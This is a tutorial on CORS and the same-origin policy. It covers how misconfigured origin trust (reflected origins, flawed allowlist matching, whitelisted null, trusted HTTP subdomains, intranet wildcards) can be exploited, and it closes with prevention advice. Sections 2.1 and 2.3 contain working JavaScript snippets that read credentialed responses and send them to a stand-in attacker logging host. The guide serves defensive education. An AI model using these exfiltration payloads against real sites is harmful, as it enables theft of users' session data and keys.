# 1. Fundamentals

## 1.1 - WTF is CORS

CORS (cross-origin resource sharing) is a browser feature that lets a website selectively allow other domains to access its resources. It's essentially a controlled way to relax the **same-origin policy (SOP)** — the default rule that stops one site (say `` `evil.com` ``) from reading data off another (`` `bank.com` ``) via JavaScript.

Without CORS, that separation is total. With CORS, `` `bank.com` `` can say "actually, requests from `` `partner.com` `` are allowed to read my data" — giving developers flexibility for legitimate cross-domain use cases (APIs, widgets, etc.).

The catch: if this policy is set up carelessly (e.g. trusting too many origins, or trusting them incorrectly), it opens the door to cross-domain attacks — an attacker's site could end up reading data it shouldn't.

One important distinction: **CORS doesn't protect against CSRF.** They solve different problems — CORS controls whether a script on another origin can *read the response* of a request; it doesn't stop a browser from *sending* a request with the victim's cookies in the first place, which is what CSRF exploits.

---

## 1.2 - Same-origin policy

### What is the same-origin policy?

The same-origin policy (SOP) is a browser security rule that stops websites from being able to attack each other. Specifically, it stops JavaScript running on one origin from reading data that belongs to a different origin.

An **origin** is made up of three parts: the **scheme** (`http`/`https`), the **domain**, and the **port**. Take this URL as an example:

```
http://normal-website.com/example/example.html
```

- Scheme: `http`
- Domain: `normal-website.com`
- Port: `80`

If a page at that URL tries to access other URLs, here's what SOP allows:

| Target URL | Allowed? | Why |
|---|---|---|
| `http://normal-website.com/example/` | Yes | Same scheme, domain, port |
| `http://normal-website.com/example2/` | Yes | Same scheme, domain, port |
| `https://normal-website.com/example/` | No | Different scheme (and port) |
| `http://en.normal-website.com/example/` | No | Different domain (subdomain counts as different) |
| `http://www.normal-website.com/example/` | No | Different domain |
| `http://normal-website.com:8080/example/` | No* | Different port |

*Old versions of Internet Explorer ignored the port, so this was an exception there.

### Why does this rule exist?

When your browser sends a request to a site, it automatically attaches any cookies tied to that site — including your login session cookie. That means the response comes back *personalized*, containing your private data.

Without SOP, any malicious site you visit could quietly make requests to, say, Gmail or Facebook using your existing login session, and then read your private messages or emails straight out of the response with JavaScript. SOP exists specifically to block that.

### How is it actually enforced?

SOP mainly blocks **JavaScript from reading cross-origin content** — it doesn't block loading resources cross-origin. So things like this still work fine:

```
<img src="https://other-domain.com/photo.jpg">
<video src="https://other-domain.com/video.mp4">
<script src="https://other-domain.com/script.js"></script>
```

The browser will load these resources normally. What it *won't* let your page's JavaScript do is peek inside the response content from another origin.

### A few exceptions to the rule

- **Write-only, no read:** e.g. you can set `location.href` on another window/iframe (redirect it somewhere), but you can't read its current value.
- **Read-only, no write:** e.g. `window.length` (number of frames) and `window.closed` can be read cross-origin, but not modified.
- **Some functions are callable cross-origin:** e.g. `close()`, `blur()`, `focus()` on another window, and `postMessage()` — a safe, purpose-built way to pass messages between origins.

### Cookies are looser than SOP

Cookies don't strictly follow SOP — by default they're shared across *all subdomains* of a site, even though each subdomain is technically a separate origin. You can reduce (not eliminate) the risk this creates by setting the `HttpOnly` flag on sensitive cookies, which stops JavaScript from reading them at all.

### Loosening SOP with `document.domain`

Pages can relax SOP between themselves using `document.domain` — but only between domains that share the same parent. For example:

```
marketing.example.com  →  sets document.domain = "example.com"
example.com             →  sets document.domain = "example.com"
```

Once both sides set this, they can access each other despite being different origins.

> **Note**: In the past, sites could set `document.domain` all the way up to just the TLD (like `com`), which would've let *any* `.com` site access any other. Modern browsers block this now for obvious safety reasons.

## 1.3 - CORS and the Access-Control-Allow-Origin Header

CORS works by having servers and browsers exchange a set of special HTTP headers that control which outside origins are allowed to access a resource. The most important of these headers is `Access-Control-Allow-Origin`.

### What does `Access-Control-Allow-Origin` do?

When a website makes a cross-origin request, the server can respond with this header to say "this origin is allowed to read my response." The browser compares that value against the origin that actually made the request — if they match, it lets the requesting page's JavaScript access the response. If they don't match, the browser blocks it.

### A basic example

Say `` `normal-website.com` `` makes a request to `` `robust-website.com` ``:

```
GET /data HTTP/1.1
Host: robust-website.com
Origin: https://normal-website.com
```

If the server responds with:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://normal-website.com
```

The origins match, so the browser lets `normal-website.com`'s JavaScript read the response.

Note: the header can technically accept `null`, a wildcard (`*`), or (per spec) multiple origins — but in practice, no browser actually supports listing multiple origins, and the wildcard has real restrictions (covered below).

### What about requests that include cookies or login credentials?

By default, cross-origin requests are sent **without** credentials (cookies, `Authorization` headers, etc.) — even if the browser would normally attach them. To allow credentialed requests, the server has to explicitly opt in with a second header:

```
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Credentials: true
```

Only then will the browser allow the requesting page to read a response that was generated using the user's cookies/session.

### The wildcard (`*`) and why it's restricted

Servers can allow *any* origin using:

```
Access-Control-Allow-Origin: *
```

But you can't get creative with it — something like `` `https://*.normal-website.com` `` is **not valid**; the wildcard only works as a full stand-alone value.

Critically, the wildcard **cannot be combined with credentials**. This is blocked for good reason:

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true   ← NOT allowed
```

If this combination were permitted, literally any website could read a logged-in user's private data — a serious security hole.

> **Note**: Because of this restriction, some servers try to "work around" it by dynamically generating the `Access-Control-Allow-Origin` header based on whatever `Origin` the *client* sends — essentially reflecting it back and calling it allowed. This defeats the purpose of the restriction and is a common source of real CORS vulnerabilities.

### Pre-flight checks

For "non-simple" cross-origin requests — ones using unusual HTTP methods or custom headers — the browser sends a preliminary check first, using the `OPTIONS` method, before the real request goes out. This is the **pre-flight check**, and it exists to protect older/legacy endpoints from being hit unexpectedly by newer CORS-enabled request types.

Example pre-flight request (trying to use `PUT` with a custom header):

```
OPTIONS /data HTTP/1.1
Host: <some website>
Origin: https://normal-website.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Special-Request-Header
```

Server's response, spelling out what's allowed:

```
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Special-Request-Header
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```

If the browser sees its intended method/headers are on the allowed list, it goes ahead with the real request. (`Access-Control-Max-Age` just tells the browser how long it can cache this pre-flight result before checking again.) Pre-flight checks add an extra round trip, so they come with a small performance cost.

### Does CORS protect against CSRF?

**No** — this is a common misconception. CORS and CSRF solve different problems:

- CORS controls whether a script on another origin is allowed to **read the response** of a cross-origin request.
- CSRF doesn't care about reading responses — it just needs the browser to **send** a request (with the victim's cookies attached) that triggers some action.

In fact, a poorly configured CORS setup can make CSRF-style attacks *worse*, not better. And plenty of CSRF techniques — plain HTML forms, cross-domain resource includes — don't touch CORS at all.

# 2. Vulnerabilities arising from CORS misconfiguration

Many modern websites use CORS to allow access from subdomains and trusted third parties. Their implementation of CORS may contain mistakes or be overly lenient to ensure that everything works, and this can result in exploitable vulnerabilities.

## 2.1 - Server-generated ACAO header from client-specified Origin header

Managing an allow-list of trusted domains is tedious, and mistakes can break things — so some applications take a shortcut: they just read whatever `Origin` the request sends and echo it straight back as the trusted origin. Effectively, this ends up trusting *everyone*.

Example request from an attacker's site:

```
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```

Server's response:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
```

This tells the browser: "`malicious-website.com` is allowed to read this response, *including* when credentials (cookies) are sent." Since the origin is just reflected back verbatim, this same trust would be granted to **any** domain that asks — not just this one attacker.

If the response contains anything sensitive (an API key, a CSRF token, private data), an attacker can steal it with a script like this hosted on their own site:

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
    location='//malicious-website.com/log?key='+this.responseText;
};
```

Here's what happens: the victim's browser sends the request *with their session cookie* (`withCredentials = true`), the vulnerable server trusts the attacker's origin and allows it, and the script exfiltrates the response by redirecting to the attacker's own logging endpoint with the stolen data attached.

## 2.2 - Errors parsing Origin headers

Instead of trusting *any* origin, some applications use an **allowlist** — checking each incoming `Origin` against a set of approved domains, and only reflecting it back in `Access-Control-Allow-Origin` if it's on the list.

Normal flow:

```
GET /data HTTP/1.1
Host: normal-website.com
Origin: https://innocent-website.com
```

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://innocent-website.com
```

The problem is in *how* that allowlist is checked. Many apps try to allow "all our subdomains" (or a partner's) using prefix/suffix string matching or regex — and small mistakes there can let unintended domains slip through.

**Example — suffix matching gone wrong:**

If the app allows any origin *ending in*: `` `normal-website.com` ``, an attacker can just register:

```
hackersnormal-website.com
```

...which technically ends with that string, even though it's a completely different domain.

**Example — prefix matching gone wrong:**

If the app allows any origin *starting with* `` `normal-website.com` ``, an attacker can register:

```
normal-website.com.evil-user.net
```

...which satisfies the prefix check, but is actually a subdomain the attacker fully controls.

## 2.3 - Whitelisted null origin value

Browsers sometimes send `Origin: null` in edge cases — cross-origin redirects, `file://` requests, sandboxed iframes, or data loaded from serialized sources.

Some apps whitelist `null` too, often just to make local development easier:

```
GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null
```

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

This is exploitable, because an attacker can deliberately *force* their own request to carry `Origin: null` — satisfying the whitelist on purpose. One common way is a sandboxed iframe:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() { location='malicious-website.com/log?key='+this.responseText; };
</script>"></iframe>
```

Because the iframe is sandboxed and loaded from a `data:` URI, the browser sends `Origin: null` — which the vulnerable server happily trusts, letting the attacker steal the victim's session data just like in the earlier example.

## 2.4 - Exploiting XSS via CORS trust relationships

Even a "properly" configured CORS setup still creates a trust relationship between two origins. If a trusted origin has an XSS flaw, that trust becomes a liability — an attacker can use the XSS to run JavaScript *as* the trusted origin, and that script can then use CORS to pull sensitive data from the site that trusts it.

Example — the main site trusts its own subdomain:

```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...
```

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

This trust is reasonable *as long as the subdomain is secure*. But if the subdomain has an XSS bug, an attacker can inject a script there via a crafted URL:

```
https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
```

That injected script runs *as* the trusted subdomain, so it can make an authenticated CORS request to `vulnerable-website.com` and steal whatever comes back (like the API key) — the main site has no way to know the request didn't come from a legitimate use of the subdomain.

## 2.5 - Breaking TLS with poorly configured CORS

This one applies even to a site that does HTTPS *everywhere* — if it whitelists a subdomain that's still reachable over plain HTTP.

```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...
```

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

Because that HTTP origin is trusted, an attacker who can intercept the victim's network traffic (e.g. on public wifi) can abuse this:

1. Victim makes *any* plain HTTP request (to anything).
2. Attacker intercepts it and injects a redirect to `` `http://trusted-subdomain.vulnerable-website.com` ``.
3. Victim's browser follows the redirect.
4. Attacker intercepts *that* request too (it's unencrypted HTTP, so it's readable/modifiable) and responds with a fake page.
5. That fake page runs a CORS request to `` `https://vulnerable-website.com` ``, sending the trusted subdomain's origin.
6. The vulnerable app sees the whitelisted origin and returns the sensitive data — not realizing the request didn't actually come from the real subdomain.
7. Since the attacker controls the fake page, they can read that response and send it wherever they want.

The scary part: this works even if the main site itself does everything right — full HTTPS, no HTTP endpoints of its own, `Secure`-flagged cookies. The weak link is trusting *any* HTTP origin, even a subdomain, since HTTP traffic can always be intercepted and tampered with.

## 2.6 - Intranets and CORS without credentials

Most CORS attacks depend on this header being present:

```
Access-Control-Allow-Credentials: true
```

Without it, the victim's cookies aren't sent, so the attacker can only see *unauthenticated* content — data anyone could get just by visiting the site directly. Normally that makes the attack pointless.

**Except when the site isn't directly reachable by the attacker in the first place** — like an internal company site, only accessible on a private/intranet network. Internal tools often have weaker security than public-facing ones, since the assumption is "only trusted employees can reach it anyway."

Example intranet request:

```
GET /reader?url=doc1.pdf
Host: intranet.normal-website.com
Origin: https://normal-website.com
```

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
```

This server trusts *any* origin, even without credentials. Normally that wouldn't matter much — but here it does, because the attacker can't reach `intranet.normal-website.com` directly (it's on a private network). 

If a victim on that internal network visits the attacker's public website, though, the *victim's browser* can reach the intranet just fine. The attacker's page can make a CORS request to the intranet site, and since it's wide open (`Access-Control-Allow-Origin: *`), the browser will happily fetch the response and hand it back to the attacker's JavaScript — using the victim as an unwitting proxy into a network the attacker could never access on their own.

# 3. How to prevent CORS-based attacks

Since CORS vulnerabilities almost always come down to misconfiguration, fixing them is mostly about configuring things correctly:

- **Be specific about who's trusted.** If a resource has sensitive data, `Access-Control-Allow-Origin` should name the exact trusted origin — not something guessed or auto-generated.

- **Only allow origins you actually trust.** This sounds obvious, but a common mistake is dynamically reflecting whatever `Origin` header the request sends, without checking it against anything. That's essentially trusting everyone — easy to exploit.

- **Don't whitelist `null`.** Browsers send `Origin: null` in edge cases like sandboxed iframes or local `file://` requests — situations an attacker can deliberately trigger. Always specify real, trusted origins instead.

- **Don't use wildcards on internal networks.** Even inside a private network, a wildcard (`*`) is risky — because a browser sitting on that internal network can still visit untrusted external sites, which can then use the victim's browser as a bridge back into the internal resource.

- **CORS is a browser-side rule, not real security.** It controls what a *browser* will allow JavaScript to read — it does nothing to stop an attacker from directly forging a request from a trusted origin using tools like `curl` or Burp (no browser involved, no CORS check enforced). So CORS should never replace actual server-side protections like authentication and proper session management — it's a complement to them, not a substitute.
